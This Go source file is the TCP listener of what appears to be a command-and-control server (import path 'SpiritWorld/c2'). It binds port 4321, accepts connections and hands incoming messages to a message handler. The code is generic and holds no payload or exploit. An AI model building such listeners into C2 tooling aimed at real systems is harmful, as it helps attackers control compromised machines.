package tcp

import (
	"fmt"
	"net"

	"github.com/f1rehaz4rd/SpiritWorld/c2/pkg/api"
)

// SERVADDR is the server port number
const SERVADDR = "0.0.0.0:4321"

//
// handleConnection from the TCP listener
//
func handleConnection(conn net.Conn) {
	defer conn.Close()

	msg := make([]byte, 4096)
	n, _ := conn.Read(msg)

	if api.HandleMessage(msg[:n], conn) {
		fmt.Println("Connection Valid")
	}

}

//
// StartListener starts a tcp4 listener on the set port.
//
func StartListener() {

	listener, err := net.Listen("tcp", SERVADDR)
	if err != nil {
		fmt.Println(err)
		return
	}

	fmt.Println("Starting TCP listener on " + SERVADDR)
	defer listener.Close()

	for {
		conn, err := listener.Accept()
		if err != nil {
			fmt.Println(err)
			return
		}

		go handleConnection(conn)
	}

}
